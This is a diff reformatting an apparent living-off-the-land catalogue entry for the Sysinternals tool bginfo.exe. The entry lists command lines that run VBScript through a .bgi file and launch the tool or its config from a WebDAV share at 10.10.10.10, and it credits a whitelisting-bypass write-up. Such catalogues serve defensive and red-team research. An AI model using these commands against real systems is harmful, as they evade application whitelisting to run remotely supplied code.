@@ -1,27 +1,17 @@
 ---
+name: bginfo.exe
+description: Sysinternals tool to set desktop background with info
 functions:
   execute:
-    -
-      Name: Bginfo.exe
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: bginfo.exe bginfo.bgi /popup /nolicprompt
-          Description: Execute VBscript code that is referenced within the bginfo.bgi file.
-          Command: '"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt'
-          Description: Execute bginfo.exe from a WebDAV server.
-          Command: '"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt'
-          Description: This style of execution may not longer work due to patch.
-      Full_Path:
-          No fixed path
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
-      Notes: Thanks to Oddvar Moe - @oddvarmoe
+    - description: Execute VBscript code that is referenced within the bginfo.bgi file.
+      code: bginfo.exe bginfo.bgi /popup /nolicprompt
+    - description: Execute bginfo.exe from a WebDAV server.
+      code: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
+    - description: This style of execution may not longer work due to patch.
+      code: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
+resources: 
+    - resource: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
+fullpath: 
+    - path: No fixed path
+notes: Thanks to Oddvar Moe - @oddvarmoe
 ---
